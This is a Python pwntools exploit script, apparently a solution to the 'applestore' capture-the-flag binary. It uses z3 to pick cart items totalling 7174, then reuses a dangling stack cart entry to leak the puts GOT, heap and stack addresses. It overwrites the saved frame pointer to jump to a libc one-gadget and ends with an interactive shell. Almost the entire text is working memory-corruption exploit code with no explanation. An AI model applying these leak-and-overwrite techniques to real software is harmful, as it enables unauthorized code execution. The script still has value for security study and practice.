from pwn import *
import time
import z3 

elf = ELF('./applestore')

PUTS_GOT = elf.got["puts"]
myCart = elf.symbols["myCart"]

#start hacknote
p = process(["./applestore"])

def wait_write(s):
	p.write(s)
	time.sleep(0.2)

#get permutations
def getSolution():
	for i in range(20):
		for j in range(20):
			for k in range(20):
				for l in range(20):
					if(199*i + 299*j + 399*k + 499*l == 0x1c06):
						log.info("Solution: %d %d %d %d" % (i, j, l, k))
						return [i, j, l, k]
						
# solve with z3 for extra 1337 points
	
i = z3.Int('i')
j = z3.Int('j')
k = z3.Int('k')
l = z3.Int('l')

s = z3.Solver()
s.add(i >= 0, j >= 0, k > 0, l >= 0, 199*i + 299*j + 399*k + 499*l == 0x1c06)

if s.check():
	model = s.model()

solution = [model.eval(i).as_long(), model.eval(j).as_long(), model.eval(l).as_long(), model.eval(k).as_long()]
log.info("Solution: %d %d %d %d" % tuple(solution))

#solution = getSolution()

###########################
# add items totalling 7174 
# to get the iphone 8
for i in range(solution[0]):
	wait_write("2\n")
	wait_write("1\n")

for i in range(solution[1]):
	wait_write("2\n")
	wait_write("2\n")
	
for i in range(solution[2]):
	wait_write("2\n")
	wait_write("3\n")
	
for i in range(solution[3]):
	wait_write("2\n")
	wait_write("4\n")
###########################

wait_write("5\n")
wait_write("y\n")

#for i in range(28):
#	wait_write("3\n")
#	wait_write("1\n")

#wait_write("2\n")
#p.read()
#wait_write("1\nAAAABBBB\x40\xb8\x04\x08DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\x50\xb8\x04\x08XNNNNOOOOPPPPQQQQ\x40\xb8\x04\x08\x08\xb0\x04\x08")

def leak_address(addr):
	p.read()
	wait_write("3\n")
	p.read()
	wait_write("27" + p32(addr) + "BBBB\x40\xb8\x04\x08\x08\xb8\x04\x08EEEE")

	p.read(10)
	leak = u32(p.read(4))

	log.info("LEAK: 0x%08x" % (leak))
	return leak
	
#leak puts and cart addresses
puts = leak_address(PUTS_GOT)
cart = leak_address(myCart+0x8)

#get stack leak, also address I needed cool
stack_leak = cart + 0x498
stack = leak_address(stack_leak)

#get saved ebp address
saved_ebp = stack + 0x60

#local first
MAGIC = puts - 0x25037
#MAGIC = puts - 0x24927

log.info("MAGIC: 0x%08x" % (MAGIC))

#pwnlib.gdb.attach(p)
#raw_input()

wait_write("3\n")
p.read()
wait_write("27" + p32(PUTS_GOT) + "BBBB" + p32(stack+0x40) + p32(saved_ebp-0x8) + "EEEE")

# quit to trigger 
wait_write("6\nAAAA" + p32(MAGIC) + "CCCCDDDDEEE")

p.read()
p.interactive()


